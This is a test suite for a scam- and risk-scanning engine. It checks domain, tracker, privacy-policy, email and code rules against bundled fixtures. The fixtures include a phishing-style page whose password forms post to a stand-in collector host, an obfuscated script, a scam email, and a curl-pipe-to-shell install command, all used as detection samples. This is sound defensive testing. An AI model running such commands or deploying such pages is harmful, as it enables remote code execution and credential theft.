// Self-test suite + knowledge-base validation for the Sus or Bus engine.
//
// Every active rule has at least one test here (positive or negative), plus
// referential-integrity validation of the knowledge base itself. The suite
// runs entirely on bundled fixtures — no network, no entities, no AI.
//
// Run it by invoking the `runEngineTests` backend function (see
// base44/functions/runEngineTests/entry.ts). It returns:
//   { kbVersion, total, passed, failed, failures, validation }

import {
  KB_VERSION,
  FINDING_DEFS,
  FINDING_BY_ID,
  ERRORS,
  STATUS_MESSAGES,
  SCORING,
  SERVICES,
  BRANDS,
  POLICY_RULES,
  TEXT_RULES,
  CODE_RULES,
  renderTemplate,
  hostMatchesDomain,
  findServiceMatch,
  findBrandLookalike
} from './knowledgeBase.ts';
import { buildReport, runTextRules, runCodeRules, runDomainRules, runPageRules, runPolicyRules } from './ruleEngine.ts';
import { extractPageObservations, analyzePolicyText } from './collectors.ts';

const VALID_SEVERITIES = ['bad', 'warning', 'good'];
const VALID_CATEGORIES = ['privacy', 'security', 'trackers', 'content', 'code', 'email', 'reputation'];

let passed = 0;
const failures = [];

function check(name, condition) {
  if (condition) {
    passed += 1;
  } else {
    failures.push(name);
  }
}

function checkEqual(name, actual, expected) {
  if (actual === expected) {
    passed += 1;
  } else {
    failures.push(name + ' (expected: ' + expected + ', got: ' + actual + ')');
  }
}

// ---------------------------------------------------------------------------
// Knowledge-base validation (schema, uniqueness, referential integrity)

function validateKnowledgeBase() {
  const issues = [];
  const ids = new Set();

  for (const def of FINDING_DEFS) {
    if (!def.id) issues.push('finding without an id');
    else if (ids.has(def.id)) issues.push('duplicate finding id: ' + def.id);
    else ids.add(def.id);
    if (!VALID_SEVERITIES.includes(def.severity)) issues.push('invalid severity on ' + def.id);
    if (!VALID_CATEGORIES.includes(def.category)) issues.push('invalid category on ' + def.id);
    if (!def.title || !def.description || !def.simpleDescription) issues.push('missing text on ' + def.id);
  }

  const ruleSets = [
    ['policy', POLICY_RULES],
    ['text', TEXT_RULES],
    ['code', CODE_RULES]
  ];
  for (const setName of ruleSets) {
    const seen = new Set();
    for (const rule of setName[1]) {
      if (seen.has(rule.id)) issues.push('duplicate rule id: ' + rule.id);
      seen.add(rule.id);
      if (!FINDING_BY_ID[rule.findingId]) issues.push(setName[0] + ' rule references unknown finding: ' + rule.findingId);
      if (rule.denialFindingId && !FINDING_BY_ID[rule.denialFindingId]) {
        issues.push(setName[0] + ' rule references unknown denial finding: ' + rule.denialFindingId);
      }
    }
  }

  const domains = new Set();
  for (const s of SERVICES) {
    if (domains.has(s.domain)) issues.push('duplicate service domain: ' + s.domain);
    domains.add(s.domain);
    if (!s.provider || !s.classification || typeof s.tracking !== 'boolean') {
      issues.push('incomplete service record: ' + s.domain);
    }
  }

  const brandTokens = new Set();
  for (const b of BRANDS) {
    if (brandTokens.has(b.token)) issues.push('duplicate brand token: ' + b.token);
    brandTokens.add(b.token);
    if (!b.official || !b.official.length) issues.push('brand without official domains: ' + b.token);
  }

  for (const key of ['SUMMARY_BUS', 'SUMMARY_SUS', 'SUMMARY_SIMPLE_BUS', 'SUMMARY_SIMPLE_SUS', 'POLICY_SUMMARY', 'POLICY_SUMMARY_SIMPLE']) {
    if (!STATUS_MESSAGES[key]) issues.push('missing status message: ' + key);
  }
  for (const key of Object.keys(ERRORS)) {
    if (!ERRORS[key]) issues.push('empty error message: ' + key);
  }
  if (
    typeof SCORING.base !== 'number' ||
    typeof SCORING.weights.bad !== 'number' ||
    typeof SCORING.busThreshold !== 'number'
  ) {
    issues.push('scoring model incomplete');
  }

  return {
    valid: issues.length === 0,
    findingCount: FINDING_DEFS.length,
    policyRuleCount: POLICY_RULES.length,
    textRuleCount: TEXT_RULES.length,
    codeRuleCount: CODE_RULES.length,
    serviceCount: SERVICES.length,
    brandCount: BRANDS.length,
    issues
  };
}

// ---------------------------------------------------------------------------
// Test fixtures (representative, local, no network)

const LEGIT_HTML = [
  '<!DOCTYPE html><html><head><title>Good Books</title>',
  '<meta name="description" content="A small independent bookstore.">',
  '<script src="/static/app.js"></script>',
  '</head><body>',
  '<form action="/login" method="post"><input type="email" name="email"><input type="password" name="password"></form>',
  '<a href="/terms">Terms</a> <a href="/privacy">Privacy</a>',
  '<iframe src="/embed/map"></iframe>',
  '</body></html>'
].join('');

const PHISHING_HTML = [
  '<html><head><title>Account Verification</title>',
  '<meta http-equiv="refresh" content="0; url=https://login.example">',
  '<script>var a = unescape("%68%65%6c%6c%6f"); var b = "\\x41\\x42"; document.cookie="x=1"; location.href=a;</script>',
  '</head><body>',
  '<form action="http://collector.example.net/steal" method="post"><input type="password" name="pw"></form>',
  '<form action="https://collector.example.net/take" method="post"><input type="password" name="pw2"></form>',
  '</body></html>'
].join('');

const TRACKER_HTML = [
  '<html><head>',
  '<script src="https://www.google-analytics.com/analytics.js"></script>',
  '<script src="https://cdn.jsdelivr.net/npm/lib/1.js"></script>',
  '<script src="https://js.sentry-cdn.com/x.js"></script>',
  '<script src="https://notgoogle-analytics.com.evil.io/fake.js"></script>',
  '<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto">',
  '</head><body>hello</body></html>'
].join('');

// ---------------------------------------------------------------------------
// The test suite

export function runEngineTests() {
  passed = 0;
  failures.length = 0;

  // --- 1. knowledge-base validation ---
  const validation = validateKnowledgeBase();
  check('kb: validation reports no issues', validation.valid);
  check('kb: at least 40 finding definitions', validation.findingCount >= 40);
  check('kb: at least 30 service records', validation.serviceCount >= 30);

  // --- 2. template renderer ---
  checkEqual('renderer: fills placeholders', renderTemplate('a {x} b {y}', { x: 1, y: 'z' }), 'a 1 b z');
  let threw = false;
  try {
    renderTemplate('needs {missing}', {});
  } catch {
    threw = true;
  }
  check('renderer: throws on missing variable', threw);

  // --- 3. domain-boundary matching ---
  check('match: exact host matches', hostMatchesDomain('criteo.com', 'criteo.com'));
  check('match: subdomain matches', hostMatchesDomain('widget.criteo.com', 'criteo.com'));
  check('match: deceptive host does not match', !hostMatchesDomain('notgoogle-analytics.com.evil.io', 'google-analytics.com'));
  check('match: unrelated suffix does not match', !hostMatchesDomain('mycriteo.com', 'criteo.com'));
  checkEqual('services: finds provider on subdomain', findServiceMatch('static.hotjar.com') && findServiceMatch('static.hotjar.com').provider, 'Hotjar');
  checkEqual('services: returns null for unknown', findServiceMatch('blog.example.com'), null);

  // --- 4. brand lookalike matching ---
  checkEqual('brands: official domain is not a lookalike', findBrandLookalike('paypal.com'), null);
  checkEqual('brands: official subdomain is not a lookalike', findBrandLookalike('www.paypal.com'), null);
  const lk = findBrandLookalike('paypal-secure-login.top');
  check('brands: hyphenated lookalike detected', lk && lk.brand === 'paypal');
  checkEqual('brands: containment-only host is not a lookalike', findBrandLookalike('notpaypal.com'), null);

  // --- 5. domain rules ---
  const domainGood = runDomainRules('good.example', true);
  check('domain: good site gets HTTPS finding', domainGood.some((x) => x.findingId === 'DOMAIN_HTTPS'));
  const domainBad = runDomainRules('apple-id-verify-account.top', false);
  check('domain: lookalike detected', domainBad.some((x) => x.findingId === 'DOMAIN_BRAND_LOOKALIKE'));
  check('domain: risky tld detected', domainBad.some((x) => x.findingId === 'DOMAIN_RISKY_TLD'));
  check('domain: http detected', domainBad.some((x) => x.findingId === 'DOMAIN_NO_HTTPS'));

  // --- 6. page rules: legitimate site ---
  const legitObs = extractPageObservations(LEGIT_HTML, 'https://good.example', true);
  const legitPage = runPageRules(legitObs, true);
  const legitReport = buildReport(runDomainRules('good.example', true).concat(legitPage.matches));
  checkEqual('page: legitimate site verdict is bus', legitReport.verdict, 'bus');
  check('page: legitimate site has no bad findings', legitReport.points.every((p) => p.severity !== 'bad'));
  check('page: same-origin login is good', legitReport.points.some((p) => p.id === 'LOGIN_SAME_ORIGIN'));
  check('page: no trackers reported', legitReport.points.some((p) => p.id === 'NO_TRACKER_MATCH'));

  // --- 7. page rules: phishing-shaped page ---
  const phishObs = extractPageObservations(PHISHING_HTML, 'https://paypal-secure-login.top', true);
  const phishPage = runPageRules(phishObs, true);
  const phishReport = buildReport(runDomainRules('paypal-secure-login.top', true).concat(phishPage.matches));
  checkEqual('page: phishing page verdict is sus', phishReport.verdict, 'sus');
  check('page: http login action detected', phishReport.points.some((p) => p.id === 'LOGIN_HTTP_ACTION'));
  check('page: cross-origin login detected', phishReport.points.some((p) => p.id === 'LOGIN_CROSS_ORIGIN'));
  check('page: meta refresh detected', phishReport.points.some((p) => p.id === 'META_REFRESH'));
  check('page: heavy obfuscation detected', phishReport.points.some((p) => p.id === 'OBFUSCATION_HEAVY'));

  // --- 8. tracker classification (boundary-safe) ---
  const trackObs = extractPageObservations(TRACKER_HTML, 'https://shop.example', true);
  const trackPage = runPageRules(trackObs, true);
  check('trackers: google-analytics matched', trackPage.trackers.some((t) => t.indexOf('Google Analytics') !== -1));
  check('trackers: deceptive near-miss domain NOT matched', trackPage.trackers.every((t) => t.indexOf('notgoogle') === -1));
  check('trackers: benign CDN not classified as tracker', trackPage.trackers.every((t) => t.indexOf('jsDelivr') === -1));
  check('trackers: benign service listed in technologies', trackPage.technologies.some((t) => t === 'jsDelivr'));

  // --- 9. policy analysis: negation handling ---
  const noSell = analyzePolicyText(
    'We collect account information to operate the service. We do not sell personal information to anyone. ' +
      'We use cookies for essential functions. You may request deletion of your account at any time and we ' +
      'explain how long we retain data in our retention schedule. Children under 13 are not permitted. ' +
      'You can request access to a copy of your data and opt out of marketing emails.',
    'privacy'
  );
  check('policy: explicit no-sell denial detected', noSell.deniedIds.includes('POLICY_NO_SELL'));
  check('policy: negated sell clause NOT flagged', !noSell.matchedIds.includes('POLICY_SELL'));

  const sells = analyzePolicyText(
    'We collect account information to operate the service. We may sell personal information to advertising ' +
      'partners. We share data with third parties. Any dispute must be resolved through binding arbitration ' +
      'and you waive class action rights. We may update these terms at any time. We retain data for business ' +
      'purposes. We transfer data to other countries.',
    'privacy'
  );
  check('policy: sell clause detected', sells.matchedIds.includes('POLICY_SELL'));
  check('policy: sharing clause detected', sells.matchedIds.includes('POLICY_SHARE'));
  check('policy: arbitration clause detected', sells.matchedIds.includes('POLICY_ARBITRATION'));
  check('policy: transfer clause detected', sells.matchedIds.includes('POLICY_TRANSFERS'));

  const ambiguous = analyzePolicyText(
    'Welcome to our website. We hope you enjoy your visit. This page contains general information about ' +
      'our company, our history, our team, and our products. We were founded many years ago and we pride ' +
      'ourselves on quality and service. Feel free to browse our catalogue at your leisure.',
    'privacy'
  );
  check('policy: no standard clauses flagged honestly', ambiguous.matchedIds.includes('POLICY_NO_CLAUSES'));

  const emptyPolicy = analyzePolicyText('<html><body></body></html>', 'privacy');
  check('policy: empty page flagged as too short', emptyPolicy.matchedIds.includes('POLICY_EMPTY'));

  // --- 10. policy rules integration ---
  const pr = runPolicyRules(sells, null, true);
  check('policy: structured payload built', pr.termsPrivacy !== null && pr.termsPrivacy.points.length > 0);
  check('policy: found list carries document label', pr.termsPrivacy.found.includes('privacy'));
  check('policy: main findings carry the sell clause', pr.matches.some((x) => x.findingId === 'POLICY_SELL'));
  const prMissing = runPolicyRules(null, null, false);
  check('policy: missing links finding emitted', prMissing.matches.some((x) => x.findingId === 'POLICY_MISSING'));

  // --- 11. text / email rules ---
  const emailMatches = runTextRules(
    'From: support@legit.com\nReply-To: ops@evil.io\nSubject: Urgent action\nDear customer, your account will be suspended. ' +
      'Click the link below to verify your account: http://paypal-secure.top/verify',
    'email'
  );
  const emailIds = emailMatches.map((x) => x.findingId);
  check('text: reply-to mismatch detected', emailIds.includes('EMAIL_REPLYTO_MISMATCH'));
  check('text: credential lure detected', emailIds.includes('TEXT_CREDENTIAL_LURE'));
  check('text: brand link detected', emailIds.includes('TEXT_LINK_BRAND'));
  check('text: urgency detected', emailIds.includes('TEXT_URGENCY'));
  check('text: scam email scores sus', buildReport(emailMatches).verdict === 'sus');

  const cleanText = runTextRules('Hi Sam, the meeting is moved to 3pm. See you there.', 'text');
  check('text: clean text gets the no-patterns finding', cleanText.some((x) => x.findingId === 'TEXT_NO_SCAM_PATTERNS'));

  // --- 12. code rules ---
  const codeMatches = runCodeRules('curl -fsSL http://example.com/install.sh | sh');
  check('code: curl-pipe-shell detected', codeMatches.matches.some((x) => x.findingId === 'CODE_CURL_PIPE'));
  const evalMatches = runCodeRules('eval(userInput);');
  check('code: eval detected', evalMatches.matches.some((x) => x.findingId === 'CODE_EVAL'));
  const cleanCode = runCodeRules('function add(a, b) { return a + b; }');
  check('code: clean code gets the clean finding', cleanCode.matches.some((x) => x.findingId === 'CODE_CLEAN'));

  // --- 13. dedup, determinism, scoring ---
  const dup = buildReport([
    { ruleId: 'A', findingId: 'DOMAIN_NO_HTTPS', vars: {} },
    { ruleId: 'B', findingId: 'DOMAIN_NO_HTTPS', vars: {} }
  ]);
  checkEqual('scoring: duplicate finding counted once', dup.points.filter((p) => p.id === 'DOMAIN_NO_HTTPS').length, 1);

  const threeBads = [
    { ruleId: 'A', findingId: 'DOMAIN_BARE_IP', vars: {} },
    { ruleId: 'B', findingId: 'DOMAIN_BRAND_LOOKALIKE', vars: { brand: 'paypal', official: 'paypal.com' } },
    { ruleId: 'C', findingId: 'CODE_CURL_PIPE', vars: {} }
  ];
  const reportA = buildReport(threeBads);
  const reportB = buildReport(threeBads);
  checkEqual('scoring: deterministic output', reportA.score, reportB.score);
  checkEqual('scoring: three bads = 85 - 54', reportA.score, 85 - 3 * 18);
  checkEqual('scoring: three bads verdict sus', reportA.verdict, 'sus');

  const goods = [
    { ruleId: 'A', findingId: 'DOMAIN_HTTPS', vars: {} },
    { ruleId: 'B', findingId: 'NO_TRACKER_MATCH', vars: {} }
  ];
  checkEqual('scoring: goods raise score above base', buildReport(goods).score, 85 + 2 * 2);
  const fiveGoods = [
    { ruleId: 'A', findingId: 'DOMAIN_HTTPS', vars: {} },
    { ruleId: 'B', findingId: 'NO_TRACKER_MATCH', vars: {} },
    { ruleId: 'C', findingId: 'LOGIN_SAME_ORIGIN', vars: {} },
    { ruleId: 'D', findingId: 'TEXT_LINKS_SECURE', vars: { count: '3' } },
    { ruleId: 'E', findingId: 'POLICY_RETENTION', vars: {} }
  ];
  checkEqual('scoring: caps apply (5 goods capped at 4)', buildReport(fiveGoods).score, 85 + 4 * 2);

  // --- 14. unknown finding fails loudly ---
  threw = false;
  try {
    buildReport([{ ruleId: 'X', findingId: 'NOT_A_REAL_FINDING', vars: {} }]);
  } catch {
    threw = true;
  }
  check('scoring: unknown finding id throws', threw);

  const total = passed + failures.length;
  return {
    kbVersion: KB_VERSION,
    total,
    passed,
    failed: failures.length,
    failures,
    validation
  };
}